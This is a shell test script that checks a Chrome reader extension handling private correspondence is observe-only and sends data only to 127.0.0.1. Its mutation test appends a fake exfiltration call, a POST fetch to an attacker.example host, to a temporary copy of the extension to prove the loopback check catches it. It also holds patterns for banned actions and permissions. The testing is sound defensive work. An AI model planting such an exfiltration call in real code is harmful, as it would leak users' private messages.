#!/bin/sh
# reader-probe.sh -- the Chrome reader is OBSERVE ONLY, and loopback only.
#
# These are not style checks. VIKIVERSE_V1 2.2c defines four rungs of authority
# and this extension claims the lowest one, `observe`. A claim like that is
# worth exactly as much as the check that enforces it, so:
#
#   R1-R5  no code path can act as Warren -- no click, submit, synthetic event,
#          innerHTML, or value assignment anywhere in the extension
#   R6     the only network destination is 127.0.0.1. Everything this reads is
#          private correspondence; a configurable endpoint is one mistyped
#          field away from posting it to a stranger, and no convenience is
#          worth that, so there is deliberately no setting for it
#   R7-R8  every extractor reports a STATUS, so "nothing there" and "I cannot
#          see any more" are different answers. A scraper that silently returns
#          zero when its selectors break launders breakage into false calm --
#          the exact coverage lie 2.5 forbids
#
# Comments are stripped before matching, or the file's own explanation of what
# it does not do would fail the check that it does not do it.
#
# Usage: sh build/reader-probe.sh
ROOT=$(cd "$(dirname "$0")/.." && pwd)
D="$ROOT/edge/chrome"
PASS=0; FAIL=0
ok(){ PASS=$((PASS+1)); echo "  PASS  $1"; }
no(){ FAIL=$((FAIL+1)); echo "  FAIL  $1"; }

[ -d "$D" ] || { echo "no extension at $D"; exit 2; }

# Strip // and /* */ comments so prose about .click() is not mistaken for a call.
#
# THE SCHEME MUST BE PROTECTED FIRST, and getting this wrong made R6 -- the
# assertion that the ONLY network destination is loopback -- incapable of
# failing for as long as it has existed. `sed 's://.*::'` treats the `//` in
# `https://attacker.example.com/collect` as the start of a comment and truncates
# the line at `https:`, so no host ever reached the grep. PROVEN 2026-08-26 by
# appending a real exfil `fetch()` to a copy of background.js: R6 passed.
# R6b below now re-proves that on every run, so this cannot rot back.
#
# Cost of the fix: a URL written inside a COMMENT is now visible to R6 and can
# fail it. That is the right direction to err -- a commented-out endpoint in a
# reader that handles private correspondence deserves a human look.
strip_comments(){ sed 's|://|@@SCHEME@@|g' | sed 's|//.*||' | sed 's|@@SCHEME@@|://|g' \
                | sed 's:/\*.*\*/::' | grep -v '^[[:space:]]*\*' ; }
code(){ cat "$D"/background.js "$D"/popup.js "$D"/content/*.js "$D"/sites/*.js 2>/dev/null \
        | strip_comments ; }

# The R6 check as a function, so the probe can run it against a POISONED copy
# of the extension and prove it fires. An assertion about exfiltration that has
# never been shown to fail is not evidence of anything.
nonloopback_hosts(){   # $1 = extension dir
    cat "$1"/background.js "$1"/popup.js "$1"/content/*.js "$1"/sites/*.js 2>/dev/null \
      | strip_comments \
      | grep -ohE 'https?://[a-zA-Z0-9.:/*-]+' | grep -v '127\.0\.0\.1' | sort -u
}

echo "== observe only: no path can act as Warren =="
# parens escaped: these are ERE, where a bare ( opens a group
for pat in '\.click\(' '\.submit\(' 'dispatchEvent' 'execCommand'; do
  n=$(code | grep -cE "$pat" || true)
  if [ "$n" = 0 ]; then ok "R: no $pat"; else no "R: found $pat ($n)"; fi
done
n=$(code | grep -cE 'innerHTML[[:space:]]*=|document\.write' || true)
if [ "$n" = 0 ]; then ok "R5 no innerHTML / document.write"; else no "R5 found DOM writes ($n)"; fi

echo "== loopback only =="
hosts=$(nonloopback_hosts "$D")
if [ -z "$hosts" ]; then ok "R6 the only network destination is 127.0.0.1"
else no "R6 non-loopback destination in code: $hosts"; fi

# R6b: THE MUTATION TEST. R6 above is the single assertion standing between
# "this reader observes Warren's private messages" and "this reader ships them
# somewhere". It passed for weeks while a real exfil call sat in the file. So
# it now has to demonstrate it can fail, on every run, against a copy poisoned
# exactly the way a hostile or careless change would poison it.
R6TMP=$(mktemp -d 2>/dev/null || mktemp -d -t viki-r6)
cp -R "$D"/. "$R6TMP"/ 2>/dev/null
printf '\nfetch("https://attacker.example.invalid/collect",{method:"POST",body:"x"});\n' \
    >> "$R6TMP/background.js"
if [ -n "$(nonloopback_hosts "$R6TMP")" ]; then
    ok "R6b CONTROL: the loopback check DETECTS an injected exfil endpoint"
else
    no "R6b CONTROL: R6 IS VACUOUS -- an exfiltrating extension passes it"
fi
rm -rf "$R6TMP"

echo "== a broken scraper must not look like a quiet day =="
for f in $(ls "$D/sites"/*.js 2>/dev/null | xargs -n1 basename 2>/dev/null | sed 's/\.js$//'); do
  n=$(grep -c "'blind'" "$D/sites/$f.js" 2>/dev/null || echo 0)
  if [ "${n:-0}" -ge 1 ]; then ok "R7 $f reports 'blind' when its anchor is gone"
  else no "R7 $f has no blind path -- selector breakage would read as zero items"; fi
done

echo "== the boundary: viki's framework vs Warren's sites =="
# manifest.json is GENERATED from sites.json so campus hostnames never live in
# viki's source. If a site hostname appears in the framework, the line has been
# crossed and the next person will not notice.
leak=$(grep -lE 'coloradomesa|facebook\.com|discord\.com|outlook\.' \
        "$D"/content/*.js "$D"/background.js "$D"/popup.js 2>/dev/null || true)
if [ -z "$leak" ]; then ok "R11 no site hostname appears in the framework"
else no "R11 a site hostname leaked into the framework: $leak"; fi
if [ -f "$D/sites.json" ] && [ -x "$D/build-manifest.sh" ]; then
  ok "R12 manifest is generated from sites.json, not hand-maintained"
else no "R12 sites.json / build-manifest.sh missing"; fi

echo "== manifest =="
if command -v python3 >/dev/null 2>&1; then
  if python3 -c "
import json,sys
m=json.load(open('$D/manifest.json'))
assert m['manifest_version']==3
assert all(h.startswith('http://127.0.0.1') or h.startswith('https://') for h in m['host_permissions'])
banned={'tabs','webRequest','scripting','cookies','history','downloads'}
assert not (banned & set(m['permissions'])), m['permissions']
" 2>/dev/null
  then ok "R9 MV3, and no tabs/scripting/cookies/history permission"
  else no "R9 manifest is invalid or requests a permission a reader does not need"; fi
else
  echo "  SKIP  R9 (no python3)"
fi

echo "== extraction logic (fixtures) =="
if command -v node >/dev/null 2>&1; then
  if node "$D/test/fixtures.mjs" >/dev/null 2>&1; then
    ok "R10 the status machine passes its fixtures (blind vs quiet vs signed-out)"
  else
    no "R10 fixtures FAILED -- run: node edge/chrome/test/fixtures.mjs"
  fi
else
  echo "  SKIP  R10 (no node)"
fi

echo
echo "PASS=$PASS FAIL=$FAIL"
[ "$FAIL" = 0 ]
